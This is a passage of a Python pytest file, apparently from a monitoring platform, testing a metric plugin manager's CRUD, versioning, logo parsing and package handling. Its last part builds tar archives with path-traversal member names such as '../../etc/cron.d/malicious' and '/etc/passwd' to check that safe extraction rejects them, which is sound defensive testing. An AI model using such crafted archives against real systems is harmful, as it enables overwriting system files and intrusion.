"""
测试 metric_plugin.manager.base 模块
"""

import io
import tarfile
from pathlib import Path
from typing import Any

import pytest
from pytest_mock import MockerFixture
from typing_extensions import override

from bk_monitor_base.domains.metric_plugin.define import (
    CreatePluginParams,
    CreatePluginVersionParams,
    MetricPlugin,
    MetricPluginParams,
    MetricPluginStatus,
    UpdatePluginVersionParams,
    VersionTuple,
)
from bk_monitor_base.domains.metric_plugin.errors import (
    MetricPluginNotFoundError,
    MetricPluginRemoteCollectDisableError,
    MetricPluginVersionNotFoundError,
)
from bk_monitor_base.domains.metric_plugin.manager.base import BaseMetricPluginManager, OSType
from bk_monitor_base.domains.metric_plugin.models import MetricPluginModel, MetricPluginVersionModel


class MockMetricPluginManager(BaseMetricPluginManager):
    """模拟插件管理器"""

    type = "script"

    def apply_data_link(self, *args: list[Any], **kwargs: dict[str, Any]) -> Any:
        """模拟申请数据链路"""
        return {"data_id": "test_data_id"}

    def delete_data_link(self, *args: list[Any], **kwargs: dict[str, Any]) -> Any:
        """模拟删除数据链路"""
        return {"data_id": "test_data_id"}

    def register(self, operator: str) -> list[str]:
        """模拟注册插件"""
        return []

    @classmethod
    def _parse_define(
        cls,
        bk_tenant_id: str,
        operator: str,
        extract_dir: Path,
        plugin_id: str,
        meta_data: dict[str, Any],
    ) -> dict[str, Any]:
        """模拟解析插件定义"""
        return {"script": "echo 'mock'"}

    @override
    def get_supported_os_types(self) -> list[OSType]:
        """获取支持的操作系统类型"""
        return [OSType.LINUX]

    @override
    def export_package(self, operator: str) -> str:
        """模拟导出插件包"""
        return "http://example.com/mock_plugin_package.tar.gz"


@pytest.mark.django_db(databases=["default"])
class TestBaseMetricPluginManager:
    """测试 BaseMetricPluginManager 基类"""

    def setup_method(self):
        """设置测试数据"""
        self.bk_tenant_id = "test_tenant"
        self.bk_biz_id = 1
        self.plugin_id = "test_plugin"
        self.operator = "admin"

        # 创建插件模型和版本模型用于测试
        self.plugin_model = MetricPluginModel.objects.create(
            bk_tenant_id=self.bk_tenant_id,
            bk_biz_id=self.bk_biz_id,
            plugin_id=self.plugin_id,
            type="script",
            created_by=self.operator,
            label="test_label",
        )

        self.version_model = MetricPluginVersionModel.objects.create(
            bk_tenant_id=self.bk_tenant_id,
            bk_biz_id=self.bk_biz_id,
            plugin=self.plugin_model,
            name="测试插件",
            description_md="# 测试插件",
            params=[],
            define={"script": "echo 'test'"},
            version="000001.000000",
            version_log="初始版本",
            status=MetricPluginStatus.DEBUG,
            updated_by=self.operator,
        )

        # 创建插件对象
        self.plugin = self.plugin_model.to_plugin()
        self.manager = MockMetricPluginManager(self.plugin)

    def test_manager_initialization(self):
        """测试管理器初始化"""
        assert self.manager.plugin == self.plugin
        assert isinstance(self.manager, BaseMetricPluginManager)

    def test_apply_data_link_abstract(self):
        """测试申请数据链路抽象方法"""
        # 测试抽象方法存在
        assert hasattr(self.manager, "apply_data_link")
        assert callable(self.manager.apply_data_link)

    def test_create_plugin_success(self):
        """测试创建插件 - 成功场景"""
        # 准备创建参数
        params = CreatePluginParams(
            id="new_plugin",
            type="script",
            name="新插件",
            label="new_label",
            description_md="# 新插件",
            params=[MetricPluginParams(name="param1", type="string")],
            define={"script": "echo 'new'"},
            version=VersionTuple(major=1, minor=0),
            status=MetricPluginStatus.DEBUG,
        )

        # 创建插件
        manager = MockMetricPluginManager.create_plugin(
            bk_tenant_id=self.bk_tenant_id, bk_biz_id=self.bk_biz_id, params=params, operator=self.operator
        )

        # 验证返回的 manager 实例
        assert isinstance(manager, MockMetricPluginManager)
        assert manager.plugin.id == "new_plugin"
        assert manager.plugin.name == "新插件"
        assert manager.plugin.type == "script"
        assert manager.plugin.bk_tenant_id == self.bk_tenant_id
        assert manager.plugin.bk_biz_id == self.bk_biz_id
        assert manager.plugin.version == VersionTuple(major=1, minor=0)
        assert manager.plugin.status == MetricPluginStatus.DEBUG

        # 验证数据库中的数据
        plugin_model = MetricPluginModel.objects.get(plugin_id="new_plugin")
        assert plugin_model.bk_tenant_id == self.bk_tenant_id
        assert plugin_model.bk_biz_id == self.bk_biz_id
        assert plugin_model.type == "script"
        assert plugin_model.created_by == self.operator

        # 验证版本模型已创建
        version_model = MetricPluginVersionModel.objects.get(plugin=plugin_model)
        assert version_model.name == "新插件"
        assert version_model.version_tuple == VersionTuple(major=1, minor=0)

    def test_create_plugin_plugin_exists(self):
        """测试创建插件 - 插件已存在"""
        # 准备创建参数（使用已存在的插件ID）
        params = CreatePluginParams(
            id=self.plugin_id,
            type="script",
            name="新插件",
            label="new_label",
            description_md="# 新插件",
            params=[],
            define={},
            version=VersionTuple(major=1, minor=0),
        )

        # 验证抛出异常
        with pytest.raises(ValueError) as exc_info:
            MockMetricPluginManager.create_plugin(
                bk_tenant_id=self.bk_tenant_id,
                bk_biz_id=self.bk_biz_id,
                params=params,
                operator=self.operator,
            )
        assert "插件已存在" in str(exc_info.value)

    def test_create_plugin_version_success_version_changed(self):
        """测试创建插件版本 - 成功场景，版本号变更"""
        self.version_model.status = MetricPluginStatus.RELEASE
        self.version_model.save(update_fields=["status"])

        # 准备创建版本参数（主要配置变化，应该导致主版本号+1）
        params = CreatePluginVersionParams(
            name="测试插件v2",
            label="test_label",
            description_md="# 测试插件v2",
            params=[MetricPluginParams(name="param1", type="string")],
            define={"script": "echo 'test_v2'"},  # 主要配置变化
            is_support_remote=False,
            metrics=[],
            enable_metric_discovery=False,
            version=None,  # 不指定版本号，自动生成
            status=MetricPluginStatus.DEBUG,
            version_log="版本2",
        )

        # 创建插件版本
        version_changed, version = self.manager.create_plugin_version(params=params, operator=self.operator)

        # 验证版本号变更
        assert version_changed is True
        assert version == VersionTuple(major=2, minor=0)  # 主要配置变化，主版本号+1

        # 验证 manager 中的 plugin 对象被更新
        assert self.manager.plugin.version == VersionTuple(major=2, minor=0)
        assert self.manager.plugin.name == "测试插件v2"
        assert self.manager.plugin.description_md == "# 测试插件v2"
        assert self.manager.plugin.define == {"script": "echo 'test_v2'"}

        # 验证数据库中的版本模型
        version_model = MetricPluginVersionModel.objects.get(plugin=self.plugin_model, version="000002.000000")
        assert version_model.name == "测试插件v2"
        assert version_model.define == {"script": "echo 'test_v2'"}

    def test_create_plugin_version_success_version_not_changed(self):
        """测试创建插件版本 - 成功场景，版本号不变"""
        self.version_model.status = MetricPluginStatus.RELEASE
        self.version_model.save(update_fields=["status"])

        # 准备创建版本参数（只有次要配置变化，应该导致次版本号+1）
        params = CreatePluginVersionParams(
            name="测试插件v1.1",  # 次要配置变化
            label="test_label",
            description_md="# 测试插件v1.1",  # 次要配置变化
            params=[],  # 主要配置不变
            define={"script": "echo 'test'"},  # 主要配置不变
            is_support_remote=False,
            metrics=[],
            enable_metric_discovery=False,
            version=None,  # 不指定版本号，自动生成
            status=MetricPluginStatus.DEBUG,
            version_log="版本1.1",
        )

        # 创建插件版本
        version_changed, version = self.manager.create_plugin_version(params=params, operator=self.operator)

        # 验证版本号变更（次版本号+1）
        assert version_changed is True
        assert version == VersionTuple(major=1, minor=1)  # 次要配置变化，次版本号+1

        # 验证 manager 中的 plugin 对象被更新
        assert self.manager.plugin.version == VersionTuple(major=1, minor=1)
        assert self.manager.plugin.name == "测试插件v1.1"

    def test_create_plugin_version_success_no_change(self):
        """测试创建插件版本 - 配置无变化时直接复用当前已发布版本"""
        self.version_model.status = MetricPluginStatus.RELEASE
        self.version_model.save(update_fields=["status"])

        # 准备创建版本参数（配置完全不变）
        params = CreatePluginVersionParams(
            name="测试插件",  # 不变
            label="test_label",  # 不变
            description_md="# 测试插件",  # 不变
            params=[],  # 不变
            define={"script": "echo 'test'"},  # 不变
            is_support_remote=False,  # 不变
            metrics=[],  # 不变
            enable_metric_discovery=False,  # 不变
            version=None,  # 不指定版本号，自动生成
            status=MetricPluginStatus.DEBUG,
            version_log="无变化版本",
        )

        version_changed, version = self.manager.create_plugin_version(params=params, operator=self.operator)

        assert version_changed is False
        assert version == VersionTuple(major=1, minor=0)
        assert self.plugin_model.versions.count() == 1
        self.version_model.refresh_from_db()
        assert self.version_model.version_log == "无变化版本"

    def test_create_plugin_version_disable_remote_collect_failed(self):
        """测试创建插件版本 - 已发布远程采集插件不允许直接关闭远程采集"""
        self.version_model.status = MetricPluginStatus.RELEASE
        self.version_model.is_support_remote = True
        self.version_model.save(update_fields=["status", "is_support_remote"])

        params = CreatePluginVersionParams(
            name="测试插件",
            label="test_label",
            description_md="# 测试插件",
            params=[],
            define={"script": "echo 'test'"},
            is_support_remote=False,
            metrics=[],
            enable_metric_discovery=False,
            version=None,
            status=MetricPluginStatus.DEBUG,
            version_log="关闭远程采集",
        )

        with pytest.raises(MetricPluginRemoteCollectDisableError, match="已开启远程采集的插件无法关闭远程采集"):
            self.manager.create_plugin_version(params=params, operator=self.operator)

    def test_create_plugin_version_success_specified_version(self):
        """测试创建插件版本 - 成功场景，指定版本号"""
        # 准备创建版本参数（指定版本号）
        params = CreatePluginVersionParams(
            name="测试插件v2.0",
            label="test_label",
            description_md="# 测试插件v2.0",
            params=[],
            define={"script": "echo 'test'"},
            is_support_remote=False,
            metrics=[],
            enable_metric_discovery=False,
            version=VersionTuple(major=2, minor=0),  # 指定版本号
            status=MetricPluginStatus.DEBUG,
            version_log="版本2.0",
        )

        # 创建插件版本
        version_changed, version = self.manager.create_plugin_version(params=params, operator=self.operator)

        # 验证版本号
        assert version_changed is True
        assert version == VersionTuple(major=2, minor=0)

        # 验证 manager 中的 plugin 对象被更新
        assert self.manager.plugin.version == VersionTuple(major=2, minor=0)
        assert self.manager.plugin.name == "测试插件v2.0"

    def test_create_plugin_version_plugin_not_found(self):
        """测试创建插件版本 - 插件不存在"""
        # 创建一个不存在的插件对象
        non_existent_plugin = MetricPlugin(
            bk_tenant_id="non_existent_tenant",
            bk_biz_id=1,
            id="non_existent_plugin",
            type="script",
            name="不存在的插件",
            version=VersionTuple(1, 0),
            status=MetricPluginStatus.DEBUG,
            created_by="admin",
            updated_by="admin",
        )
        manager = MockMetricPluginManager(non_existent_plugin)

        # 准备创建版本参数
        params = CreatePluginVersionParams(
            name="测试插件",
            label="test_label",
            description_md="# 测试插件",
            params=[],
            define={},
            is_support_remote=False,
            metrics=[],
            enable_metric_discovery=False,
            version=None,
            status=MetricPluginStatus.DEBUG,
        )

        # 验证抛出异常
        with pytest.raises(MetricPluginNotFoundError) as exc_info:
            manager.create_plugin_version(params=params, operator=self.operator)
        assert "插件不存在" in str(exc_info.value)

    def test_update_plugin_version_success(self):
        """测试更新插件版本 - 成功场景"""
        # 准备更新参数
        params = UpdatePluginVersionParams(
            name="更新后的插件名称",
            label="updated_label",
            description_md="# 更新后的描述",
            metrics=[],
            enable_metric_discovery=True,
            version_log="更新日志",
        )

        # 更新插件版本
        self.manager.update_plugin_version(params=params, operator=self.operator)

        # 验证 manager 中的 plugin 对象被更新
        assert self.manager.plugin.name == "更新后的插件名称"
        assert self.manager.plugin.description_md == "# 更新后的描述"
        assert self.manager.plugin.enable_metric_discovery is True
        assert self.manager.plugin.version_log == "更新日志"
        assert self.manager.plugin.version == VersionTuple(major=1, minor=0)  # 版本号不变

        # 验证数据库中的版本模型被更新
        self.version_model.refresh_from_db()
        assert self.version_model.name == "更新后的插件名称"
        assert self.version_model.description_md == "# 更新后的描述"
        assert self.version_model.enable_metric_discovery is True
        assert self.version_model.version_log == "更新日志"

        # 验证 label 被更新（存储在 MetricPluginModel 中）
        self.plugin_model.refresh_from_db()
        assert self.plugin_model.label == "updated_label"

    def test_update_plugin_version_plugin_not_found(self):
        """测试更新插件版本 - 插件不存在"""
        # 创建一个不存在的插件对象
        non_existent_plugin = MetricPlugin(
            bk_tenant_id="non_existent_tenant",
            bk_biz_id=1,
            id="non_existent_plugin",
            type="script",
            name="不存在的插件",
            version=VersionTuple(1, 0),
            status=MetricPluginStatus.DEBUG,
            created_by="admin",
            updated_by="admin",
        )
        manager = MockMetricPluginManager(non_existent_plugin)

        # 准备更新参数
        params = UpdatePluginVersionParams(
            name="更新后的插件名称",
            label="updated_label",
            description_md="# 更新后的描述",
            metrics=[],
            enable_metric_discovery=False,
            version_log="更新日志",
        )

        # 验证抛出异常
        with pytest.raises(MetricPluginNotFoundError) as exc_info:
            manager.update_plugin_version(params=params, operator=self.operator)
        assert "插件不存在" in str(exc_info.value)

    def test_update_plugin_version_version_not_found(self):
        """测试更新插件版本 - 版本不存在"""
        # 创建一个版本不存在的插件对象
        plugin_with_wrong_version = MetricPlugin(
            bk_tenant_id=self.bk_tenant_id,
            bk_biz_id=self.bk_biz_id,
            id=self.plugin_id,
            type="script",
            name="测试插件",
            version=VersionTuple(major=999, minor=999),  # 不存在的版本
            status=MetricPluginStatus.DEBUG,
            created_by="admin",
            updated_by="admin",
        )
        manager = MockMetricPluginManager(plugin_with_wrong_version)

        # 准备更新参数
        params = UpdatePluginVersionParams(
            name="更新后的插件名称",
            label="test_label",
            description_md="# 更新后的描述",
            metrics=[],
            enable_metric_discovery=False,
            version_log="更新日志",
        )

        # 验证抛出异常
        with pytest.raises(MetricPluginVersionNotFoundError) as exc_info:
            manager.update_plugin_version(params=params, operator=self.operator)
        assert "插件版本不存在" in str(exc_info.value)

    def test_release_plugin_version_success(self, mocker: MockerFixture):
        """测试发布插件版本 - 成功场景"""
        # Mock apply_data_link 方法
        mock_apply_data_link = mocker.spy(self.manager, "apply_data_link")

        # 发布插件版本
        self.manager.release_plugin_version(operator=self.operator)

        # 验证 apply_data_link 被调用
        mock_apply_data_link.assert_called_once()

        # 验证 manager 中的 plugin 状态被更新
        assert self.manager.plugin.status == MetricPluginStatus.RELEASE

        # 验证数据库中的版本状态被更新
        self.version_model.refresh_from_db()
        assert self.version_model.status == MetricPluginStatus.RELEASE
        assert self.version_model.updated_by == self.operator

    def test_release_plugin_version_plugin_not_found(self):
        """测试发布插件版本 - 插件不存在"""
        # 创建一个不存在的插件对象
        non_existent_plugin = MetricPlugin(
            bk_tenant_id="non_existent_tenant",
            bk_biz_id=1,
            id="non_existent_plugin",
            type="script",
            name="不存在的插件",
            version=VersionTuple(1, 0),
            status=MetricPluginStatus.DEBUG,
            created_by="admin",
            updated_by="admin",
        )
        manager = MockMetricPluginManager(non_existent_plugin)

        # 验证抛出异常
        with pytest.raises(MetricPluginNotFoundError) as exc_info:
            manager.release_plugin_version(operator=self.operator)
        assert "插件不存在" in str(exc_info.value)

    def test_delete_plugin_success(self, mocker: MockerFixture):
        """测试删除插件 - 成功场景"""
        # Mock delete_data_link 方法
        mock_delete_data_link = mocker.spy(self.manager, "delete_data_link")

        # 删除插件
        self.manager.delete_plugin(operator=self.operator)

        # 验证 delete_data_link 被调用
        mock_delete_data_link.assert_called_once()

        # 验证数据库中的插件 is_deleted 字段被设置为 True
        self.plugin_model.refresh_from_db()
        assert self.plugin_model.is_deleted is True

    def test_delete_plugin_plugin_not_found(self):
        """测试删除插件 - 插件不存在"""
        # 创建一个不存在的插件对象
        non_existent_plugin = MetricPlugin(
            bk_tenant_id="non_existent_tenant",
            bk_biz_id=1,
            id="non_existent_plugin",
            type="script",
            name="不存在的插件",
            version=VersionTuple(1, 0),
            status=MetricPluginStatus.DEBUG,
            created_by="admin",
            updated_by="admin",
        )
        manager = MockMetricPluginManager(non_existent_plugin)

        # 验证抛出异常
        with pytest.raises(MetricPluginNotFoundError) as exc_info:
            manager.delete_plugin(operator=self.operator)
        assert "插件不存在" in str(exc_info.value)


class TestParseLogoPng:
    """测试 _parse_logo_png 方法

    该方法将 logo.png 文件读取并转换为 base64 格式的 data URI 字符串。
    """

    def test_parse_logo_png_file_not_exists(self, tmp_path: Path):
        """测试 logo.png 文件不存在的情况

        当 logo.png 文件不存在时，应返回空字符串。
        """
        # 创建一个没有 logo.png 的插件目录结构
        plugin_dir = tmp_path / "test_plugin"
        info_dir = plugin_dir / "info"
        info_dir.mkdir(parents=True)

        # 调用方法
        result = MockMetricPluginManager._parse_logo_png(plugin_dir, "test_plugin")

        # 验证返回空字符串
        assert result == ""

    def test_parse_logo_png_success(self, tmp_path: Path):
        """测试成功读取并转换 logo.png 文件

        当 logo.png 文件存在且大小在限制内时，应返回带 data URI 前缀的 base64 字符串。
        """
        import base64

        # 创建一个包含 logo.png 的插件目录结构
        plugin_dir = tmp_path / "test_plugin"
        info_dir = plugin_dir / "info"
        info_dir.mkdir(parents=True)

        # 创建一个小的 PNG 文件内容（模拟 PNG 文件头）
        # PNG 文件签名: 89 50 4E 47 0D 0A 1A 0A
        png_content = b"\x89PNG\r\n\x1a\n" + b"\x00" * 100
        logo_file = info_dir / "logo.png"
        logo_file.write_bytes(png_content)

        # 调用方法
        result = MockMetricPluginManager._parse_logo_png(plugin_dir, "test_plugin")

        # 验证返回的是有效的 base64 data URI
        assert result.startswith("data:image/png;base64,")

        # 验证 base64 内容可以正确解码
        base64_data = result.split(",", 1)[1]
        decoded_content = base64.b64decode(base64_data)
        assert decoded_content == png_content

    def test_parse_logo_png_exceeds_size_limit(self, tmp_path: Path):
        """测试 logo.png 文件大小超过 2MB 限制的情况

        当文件大小超过 MAX_LOGO_SIZE_BYTES（2MB）时，应返回空字符串并记录警告日志。
        """
        from bk_monitor_base.domains.metric_plugin.models import MAX_LOGO_SIZE_BYTES

        # 创建一个包含超大 logo.png 的插件目录结构
        plugin_dir = tmp_path / "test_plugin"
        info_dir = plugin_dir / "info"
        info_dir.mkdir(parents=True)

        # 创建一个超过 2MB 的文件
        large_content = b"\x89PNG\r\n\x1a\n" + b"\x00" * (MAX_LOGO_SIZE_BYTES + 1)
        logo_file = info_dir / "logo.png"
        logo_file.write_bytes(large_content)

        # 调用方法
        result = MockMetricPluginManager._parse_logo_png(plugin_dir, "test_plugin")

        # 验证返回空字符串
        assert result == ""

    def test_parse_logo_png_exactly_at_size_limit(self, tmp_path: Path):
        """测试 logo.png 文件大小恰好等于 2MB 限制的情况

        当文件大小恰好等于 MAX_LOGO_SIZE_BYTES 时，应正常返回 base64 字符串。
        """
        from bk_monitor_base.domains.metric_plugin.models import MAX_LOGO_SIZE_BYTES

        # 创建一个包含恰好 2MB 的 logo.png 的插件目录结构
        plugin_dir = tmp_path / "test_plugin"
        info_dir = plugin_dir / "info"
        info_dir.mkdir(parents=True)

        # 创建一个恰好 2MB 的文件
        exact_content = b"\x89PNG\r\n\x1a\n" + b"\x00" * (MAX_LOGO_SIZE_BYTES - 8)  # 8 bytes for PNG header
        logo_file = info_dir / "logo.png"
        logo_file.write_bytes(exact_content)

        # 调用方法
        result = MockMetricPluginManager._parse_logo_png(plugin_dir, "test_plugin")

        # 验证返回的是有效的 base64 data URI
        assert result.startswith("data:image/png;base64,")

    def test_parse_logo_png_info_dir_not_exists(self, tmp_path: Path):
        """测试 info 目录不存在的情况

        当 info 目录本身不存在时，应返回空字符串。
        """
        # 创建一个没有 info 目录的插件目录
        plugin_dir = tmp_path / "test_plugin"
        plugin_dir.mkdir(parents=True)

        # 调用方法
        result = MockMetricPluginManager._parse_logo_png(plugin_dir, "test_plugin")

        # 验证返回空字符串
        assert result == ""

    def test_parse_logo_png_empty_file(self, tmp_path: Path):
        """测试空的 logo.png 文件

        当 logo.png 文件存在但内容为空时，应返回有效的 base64 data URI（空内容的 base64）。
        """
        # 创建一个包含空 logo.png 的插件目录结构
        plugin_dir = tmp_path / "test_plugin"
        info_dir = plugin_dir / "info"
        info_dir.mkdir(parents=True)

        # 创建一个空文件
        logo_file = info_dir / "logo.png"
        logo_file.write_bytes(b"")

        # 调用方法
        result = MockMetricPluginManager._parse_logo_png(plugin_dir, "test_plugin")

        # 空文件应返回空的 base64 data URI
        assert result == "data:image/png;base64,"

    def test_parse_logo_png_new_plugin_package_structure(self, tmp_path: Path):
        """测试新插件包结构：logo.png 在 plugin_id 目录下

        新插件包结构中，logo.png 直接放在 plugin_dir 下而不是 info 目录下，
        当 info 目录下不存在 logo.png 时，应从 plugin_dir 下读取。
        """
        import base64

        # 创建新插件包结构：logo.png 在 plugin_dir 下
        plugin_dir = tmp_path / "test_plugin"
        info_dir = plugin_dir / "info"
        info_dir.mkdir(parents=True)

        # logo.png 放在 plugin_dir 下（新插件包结构）
        png_content = b"\x89PNG\r\n\x1a\n" + b"\x00" * 100
        logo_file = plugin_dir / "logo.png"
        logo_file.write_bytes(png_content)

        # 调用方法
        result = MockMetricPluginManager._parse_logo_png(plugin_dir, "test_plugin")

        # 验证返回的是有效的 base64 data URI
        assert result.startswith("data:image/png;base64,")

        # 验证 base64 内容可以正确解码
        base64_data = result.split(",", 1)[1]
        decoded_content = base64.b64decode(base64_data)
        assert decoded_content == png_content

    def test_parse_logo_png_old_plugin_package_takes_priority(self, tmp_path: Path):
        """测试老插件包路径优先级

        当 info 目录和 plugin_dir 下都存在 logo.png 时，应优先使用 info 目录下的文件（老插件包结构）。
        """
        import base64

        # 创建同时包含两个位置 logo.png 的插件目录结构
        plugin_dir = tmp_path / "test_plugin"
        info_dir = plugin_dir / "info"
        info_dir.mkdir(parents=True)

        # 老插件包路径 (info 目录下)
        old_png_content = b"\x89PNG\r\n\x1a\n" + b"OLD_PLUGIN" + b"\x00" * 50
        old_logo_file = info_dir / "logo.png"
        old_logo_file.write_bytes(old_png_content)

        # 新插件包路径 (plugin_dir 下)
        new_png_content = b"\x89PNG\r\n\x1a\n" + b"NEW_PLUGIN" + b"\x00" * 50
        new_logo_file = plugin_dir / "logo.png"
        new_logo_file.write_bytes(new_png_content)

        # 调用方法
        result = MockMetricPluginManager._parse_logo_png(plugin_dir, "test_plugin")

        # 验证返回的是老插件包路径的内容
        assert result.startswith("data:image/png;base64,")
        base64_data = result.split(",", 1)[1]
        decoded_content = base64.b64decode(base64_data)
        assert decoded_content == old_png_content
        assert b"OLD_PLUGIN" in decoded_content

    def test_parse_logo_png_new_structure_exceeds_size_limit(self, tmp_path: Path):
        """测试新插件包结构中 logo.png 超过大小限制

        当新插件包结构中的 logo.png 超过 MAX_LOGO_SIZE_BYTES 时，应返回空字符串。
        """
        from bk_monitor_base.domains.metric_plugin.models import MAX_LOGO_SIZE_BYTES

        # 创建新插件包结构
        plugin_dir = tmp_path / "test_plugin"
        info_dir = plugin_dir / "info"
        info_dir.mkdir(parents=True)

        # logo.png 放在 plugin_dir 下且超过大小限制
        large_content = b"\x89PNG\r\n\x1a\n" + b"\x00" * (MAX_LOGO_SIZE_BYTES + 1)
        logo_file = plugin_dir / "logo.png"
        logo_file.write_bytes(large_content)

        # 调用方法
        result = MockMetricPluginManager._parse_logo_png(plugin_dir, "test_plugin")

        # 验证返回空字符串
        assert result == ""


class TestParsePackage:
    """测试插件包解析对目录输入的兼容行为。"""

    def test_parse_package_supports_directory_without_cleanup(self, tmp_path: Path, mocker: MockerFixture):
        """测试传入已解压目录时不会再次解压，也不会删除调用方目录。

        这次变更的核心是允许上层直接复用已解压目录，因此需要同时保证：
        1. 不触发 `_extract_package`
        2. 解析完成后不调用 `shutil.rmtree`
        """
        # Arrange
        package_dir = tmp_path / "plugin_package"
        plugin_dir = package_dir / "external_plugins_linux_x86_64" / "bkplugin_mysql"
        (plugin_dir / "info").mkdir(parents=True)

        mock_extract_package = mocker.patch.object(MockMetricPluginManager, "_extract_package")
        mocker.patch.object(MockMetricPluginManager, "_find_plugin_dir", return_value=(plugin_dir, "bkplugin_mysql"))
        mocker.patch.object(MockMetricPluginManager, "_parse_version_file", return_value=VersionTuple(major=1, minor=2))
        mocker.patch.object(
            MockMetricPluginManager,
            "_parse_meta_yaml",
            return_value=(
                {"plugin_type": "Script"},
                "bkplugin_mysql",
                "MySQL",
                "Script",
                "component",
                True,
            ),
        )
        mocker.patch.object(MockMetricPluginManager, "_parse_description_md", return_value="# 描述")
        mocker.patch.object(MockMetricPluginManager, "_parse_release_md", return_value="版本说明")
        mocker.patch.object(
            MockMetricPluginManager,
            "_parse_config_json",
            return_value=[MetricPluginParams(name="username", type="string")],
        )
        mocker.patch.object(MockMetricPluginManager, "_parse_metrics_json", return_value=[])
        mocker.patch.object(MockMetricPluginManager, "_parse_logo_png", return_value="data:image/png;base64,ZmFrZQ==")
        mocker.patch.object(MockMetricPluginManager, "_parse_define", return_value={"script": "echo test"})
        mock_rmtree = mocker.patch("bk_monitor_base.domains.metric_plugin.manager.base.shutil.rmtree")

        # Act
        result = MockMetricPluginManager.parse_package(
            bk_tenant_id="test_tenant",
            package_file=package_dir,
            operator="admin",
        )

        # Assert
        mock_extract_package.assert_not_called()
        mock_rmtree.assert_not_called()
        assert package_dir.exists()
        assert result.id == "bkplugin_mysql"
        assert result.type == "script"
        assert result.name == "MySQL"
        assert result.label == "component"
        assert result.is_support_remote is True
        assert result.version == VersionTuple(major=1, minor=2)
        assert result.define == {"script": "echo test"}

    def test_get_plugin_type_from_package_supports_directory_without_cleanup(
        self, tmp_path: Path, mocker: MockerFixture
    ):
        """测试从已解压目录读取插件类型时不会触发临时目录清理。"""
        # Arrange
        package_dir = tmp_path / "plugin_package"
        meta_file = package_dir / "external_plugins_linux_x86_64" / "bkplugin_mysql" / "info" / "meta.yaml"
        meta_file.parent.mkdir(parents=True)
        meta_file.write_text("plugin_type: Exporter\n", encoding="utf-8")

        mock_extract_package = mocker.patch.object(MockMetricPluginManager, "_extract_package")
        mock_rmtree = mocker.patch("bk_monitor_base.domains.metric_plugin.manager.base.shutil.rmtree")

        # Act
        plugin_type = MockMetricPluginManager.get_plugin_type_from_package(package_dir)

        # Assert
        mock_extract_package.assert_not_called()
        mock_rmtree.assert_not_called()
        assert package_dir.exists()
        assert plugin_type == "exporter"

    def test_get_plugin_type_from_package_uses_manager_directory_rules(self, tmp_path: Path):
        """测试基类类型探测只匹配自身支持的插件包目录。"""
        package_dir = tmp_path / "plugin_package"
        meta_file = package_dir / "job_plugins_linux_x86_64" / "bkplugin_mysql" / "info" / "meta.yaml"
        meta_file.parent.mkdir(parents=True)
        meta_file.write_text("plugin_type: job_mysql\n", encoding="utf-8")

        with pytest.raises(ValueError, match="解析插件包获取插件类型失败"):
            MockMetricPluginManager.get_plugin_type_from_package(package_dir)


def _make_tar_bytes(members: list[tuple[str, bytes]]) -> bytes:
    """构造 gzip 压缩的 tar 归档字节流。

    Args:
        members: 列表，每个元素为 (归档内路径, 文件内容) 的元组

    Returns:
        tar.gz 格式的字节流
    """
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name, data in members:
            info = tarfile.TarInfo(name=name)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def _make_tar_bytes_with_symlink(members: list[tuple[str, bytes]], symlinks: list[tuple[str, str]]) -> bytes:
    """构造包含符号链接的 gzip 压缩 tar 归档字节流。

    Args:
        members: 普通文件列表，每个元素为 (归档内路径, 文件内容)
        symlinks: 符号链接列表，每个元素为 (链接名, 链接目标)

    Returns:
        tar.gz 格式的字节流
    """
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for link_name, link_target in symlinks:
            info = tarfile.TarInfo(name=link_name)
            info.type = tarfile.SYMTYPE
            info.linkname = link_target
            tar.addfile(info)
        for name, data in members:
            info = tarfile.TarInfo(name=name)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


class TestSafeTarExtract:
    """测试 _safe_tar_extract 方法的路径穿越防御（CVE-2007-4559）。

    通过构造不同类型的恶意/正常 tar 归档，验证安全解压逻辑是否能够：
    - 允许合法归档正常解压
    - 拒绝包含 `..` 路径穿越的恶意成员
    - 拒绝使用绝对路径的恶意成员
    - 在混合场景下（部分合法、部分恶意）整体拒绝解压
    """

    def test_normal_extraction_succeeds(self, tmp_path: Path):
        """合法归档应正常解压，文件内容与预期一致。"""
        # Arrange
        tar_bytes = _make_tar_bytes(
            [
                ("plugin/VERSION", b"1.0.0"),
                ("plugin/info/meta.yaml", b"plugin_id: test"),
            ]
        )
        tar_file = tmp_path / "normal.tar.gz"
        tar_file.write_bytes(tar_bytes)
        extract_dir = tmp_path / "extract"
        extract_dir.mkdir()

        # Act
        with tarfile.open(tar_file, "r:gz") as tar:
            BaseMetricPluginManager._safe_tar_extract(tar, extract_dir)

        # Assert
        assert (extract_dir / "plugin" / "VERSION").read_text() == "1.0.0"
        assert (extract_dir / "plugin" / "info" / "meta.yaml").read_text() == "plugin_id: test"

    @pytest.mark.parametrize(
        "malicious_name, description",
        [
            pytest.param("../../etc/cron.d/malicious", "双层 .. 穿越", id="double-dotdot"),
            pytest.param("../outside.txt", "单层 .. 穿越", id="single-dotdot"),
            pytest.param("plugin/../../etc/passwd", "嵌套 .. 穿越", id="nested-dotdot"),
            pytest.param("plugin/../../../tmp/evil", "多层嵌套 .. 穿越", id="deep-nested-dotdot"),
        ],
    )
    def test_rejects_dotdot_path_traversal(self, tmp_path: Path, malicious_name: str, description: str):
        """包含 .. 路径穿越成员的归档应被拒绝，并在错误信息中包含恶意成员名。

        场景说明: {description}
        """
        # Arrange
        tar_bytes = _make_tar_bytes([(malicious_name, b"malicious payload")])
        tar_file = tmp_path / "evil.tar.gz"
        tar_file.write_bytes(tar_bytes)
        extract_dir = tmp_path / "extract"
        extract_dir.mkdir()

        # Act & Assert
        with tarfile.open(tar_file, "r:gz") as tar:
            with pytest.raises(ValueError, match="路径穿越"):
                BaseMetricPluginManager._safe_tar_extract(tar, extract_dir)

        assert not any(extract_dir.iterdir()), "恶意归档被拒绝后，目标目录应保持为空"

    @pytest.mark.parametrize(
        "abs_path",
        [
            pytest.param("/etc/passwd", id="etc-passwd"),
            pytest.param("/tmp/evil_file", id="tmp-evil"),
        ],
    )
    def test_rejects_absolute_path_members(self, tmp_path: Path, abs_path: str):
        """包含绝对路径成员的归档应被拒绝。"""
        # Arrange
        tar_bytes = _make_tar_bytes([(abs_path, b"overwrite system file")])
